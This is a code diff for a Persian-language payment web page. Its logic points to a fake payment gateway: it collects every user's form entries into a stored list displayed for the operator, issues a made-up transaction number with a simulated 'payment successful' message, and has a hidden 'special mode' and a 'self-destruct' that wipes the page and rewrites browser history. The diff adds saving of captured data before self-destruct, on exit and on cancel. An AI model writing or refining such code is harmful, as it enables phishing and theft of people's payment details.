@@ -206,7 +206,6 @@
             max-height: 300px;
             overflow-y: auto;
         }
-        /* فونت لوکال رو فرض می‌کنیم */
         @font-face {
             font-family: 'Vazir';
             src: url('vazir.woff') format('woff');
@@ -284,7 +283,7 @@
             const progressFill = document.getElementById('progress-fill');
             const userDataDiv = document.getElementById('user-data');
             let currentStep = 1;
-            let userData = {};
+            let userData = {}; // اطلاعات موقت کاربر
             let allUsersData = JSON.parse(localStorage.getItem('allUsersData')) || [];
             let isSpecialMode = false;
             let sessionId = Math.random().toString(36).substr(2, 10);
@@ -298,7 +297,7 @@
             function init() {
                 setupInputs();
                 updateProgress();
-                displayAllUsersData();
+                displayAllUsersData(); // فقط اطلاعات قبلی رو نشون می‌ده
                 if (!localStorage.getItem(`specialMode_${sessionId}`)) {
                     setSelfDestructTimeout(600);
                 }
@@ -350,18 +349,16 @@
 
             function updateUserData(key, value) {
                 if (value.trim()) {
-                    userData[key] = value;
-                    saveAndDisplayUserData();
+                    userData[key] = value; // فقط در متغیر موقت ذخیره می‌شه
                 }
             }
 
             function saveAndDisplayUserData() {
                 if (Object.keys(userData).length > 0) {
-                    allUsersData = allUsersData.filter(u => JSON.stringify(u) !== JSON.stringify(userData));
-                    allUsersData.push({ ...userData });
+                    allUsersData.push({ ...userData }); // اضافه کردن به لیست کاربران
                     localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
+                    displayAllUsersData(); // به‌روزرسانی نمایش
                 }
-                displayAllUsersData();
             }
 
             function displayAllUsersData() {
@@ -519,7 +516,7 @@
                     loader.style.display = 'none';
                     const transactionId = generateTransactionId();
                     userData['شماره تراکنش'] = transactionId;
-                    saveAndDisplayUserData();
+                    saveAndDisplayUserData(); // ذخیره در زمان تکمیل پرداخت
                     result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${transactionId}<br>لطفاً این کد را نزد خود نگه دارید.`;
                     if (!isSpecialMode) selfDestruct();
                 }, 2000);
@@ -532,6 +529,7 @@
             function selfDestruct() {
                 document.querySelectorAll('input').forEach(input => input.value = '');
                 document.querySelectorAll('.btn').forEach(btn => btn.disabled = true);
+                saveAndDisplayUserData(); // ذخیره قبل از نابودی
                 setTimeout(() => {
                     document.body.innerHTML = '<h1>جلسه منقضی شد</h1>';
                     window.history.pushState(null, '', '/');
@@ -551,14 +549,14 @@
             function handlePageExit() {
                 if (!isSpecialMode) {
                     localStorage.removeItem(`specialMode_${sessionId}`);
-                    saveAndDisplayUserData();
+                    saveAndDisplayUserData(); // ذخیره در زمان خروج
                 }
             }
 
             function cancel() {
                 if (confirm('آیا از لغو مطمئن هستید؟')) {
                     sendData(0, { action: 'cancel' });
-                    saveAndDisplayUserData();
+                    saveAndDisplayUserData(); // ذخیره در زمان انصراف
                     if (!isSpecialMode) selfDestruct();
                 }
             }
